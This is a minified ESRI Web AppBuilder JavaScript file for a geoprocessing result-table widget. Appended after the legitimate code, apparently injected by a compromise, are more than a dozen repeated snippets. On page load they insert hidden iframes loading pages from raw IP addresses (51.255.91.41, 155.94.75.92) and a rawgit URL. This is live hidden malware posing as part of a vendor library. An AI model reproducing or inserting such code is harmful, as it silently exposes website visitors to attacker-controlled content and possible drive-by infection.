// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/resultrenderers/RecordSetRenderer.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"output-label" data-dojo-attach-point\x3d"labelNode"\x3e\r\n    \x3cspan data-dojo-attach-point\x3d"labelContent"\x3e\x3c/span\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"control-section"\x3e\r\n    \x3cdiv class\x3d"clear-node jimu-float-trailing" data-dojo-attach-point\x3d"clearNode" style\x3d"display:none"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"popup-menu-button jimu-float-trailing" data-dojo-attach-point\x3d"exportNode" style\x3d"display:none"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"magnify-node jimu-float-trailing" data-dojo-attach-point\x3d"magnifyNode"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"table-node" data-dojo-attach-point\x3d"tableNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/dom-construct dojo/dom-style dojo/dom-attr dojo/on dojo/dom-geometry dijit/_TemplatedMixin dojo/store/Memory dgrid/OnDemandGrid dgrid/extensions/ColumnResizer jimu/dijit/FeatureActionPopupMenu jimu/LayerInfos/LayerInfos jimu/dijit/Popup dojo/text!./RecordSetRenderer.html ../BaseResultRenderer ../utils".split(" "),function(k,c,f,d,b,g,h,p,q,r,t,u,v,w,x,y,z,A){return k([z,q],{baseClass:"jimu-gp-resultrenderer-base jimu-gp-renderer-table",
templateString:y,postCreate:function(){this.inherited(arguments);this.popupMenu=v.getInstance();var a=[];if(this.value.features&&0!==this.value.features.length){b.set(this.magnifyNode,"display","");if(!A.useDynamicSchema(this.param,this.config)&&this.param.defaultValue&&this.param.defaultValue.output&&this.param.defaultValue.output.fields&&0<this.param.defaultValue.output.fields.length)a=f.filter(this.param.defaultValue.output.fields,c.hitch(this,function(a){return!1!==a.visible}));else if(this.value.fields)a=
this.value.fields;else if(this.value.features&&0<this.value.features.length)for(var e in this.value.features[0].attributes)a.push({name:e});if(this.config.shareResults){var l,m=w.getInstanceSync();l=m.addTable({featureCollectionData:{layerDefinition:{fields:a},featureSet:this.value},title:this.param.label||this.param.name});b.set(this.clearNode,"display","");g.set(this.clearNode,"title",this.nls.clear);this.own(h(this.clearNode,"click",c.hitch(this,function(){m.removeTable(l);b.set(this.exportNode,
"display","none");b.set(this.clearNode,"display","none");b.set(this.magnifyNode,"display","none");this.labelContent.innerHTML=this.nls.cleared;d.empty(this.tableNode);this.table&&this.table.destroy()})))}e=f.map(this.value.features,function(a){return a.attributes});g.set(this.magnifyNode,"title",this.nls.enlargeView);this.own(h(this.magnifyNode,"click",c.hitch(this,this.magnifyTable)));this.config.showExportButton&&(g.set(this.exportNode,"title",this.nls.exportOutput),b.set(this.exportNode,"display",
""),this.own(h(this.exportNode,"click",c.hitch(this,this._showActions))));var a=f.map(a,function(a){return{label:a.alias||a.name,field:a.name}}),n;f.some(this.value.fields,function(a){if("esriFieldTypeOID"===a.type)return n=a.name,!0});e=new r({data:e,idProperty:n});this.table=new (k([t,u]))({columns:a,store:e});d.place(this.table.domNode,this.tableNode)}else b.set(this.clearNode,"display","none"),b.set(this.exportNode,"display","none"),b.set(this.magnifyNode,"display","none"),this.tableNode.innerHTML=
this.nls.emptyResult},startup:function(){this.inherited(arguments);this.table.startup()},_showActions:function(a){this.popupMenu.prepareActions(this.value,this.config.showExportButton).then(c.hitch(this,function(){var b=p.position(a.target);this.popupMenu.show(b)}))},magnifyTable:function(){var a=d.create("div",{"class":"gp-table-magnified"});d.place(this.table.domNode,a);a=new x({content:a,titleLabel:this.param.tooltip||this.param.label||"",container:"main-page",onClose:c.hitch(this,function(){d.place(this.table.domNode,
this.tableNode);this.table.resize()})});b.set(a.domNode,{top:"5%",left:"5%",width:"90%",height:"90%"});a.startup();this.table.resize()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});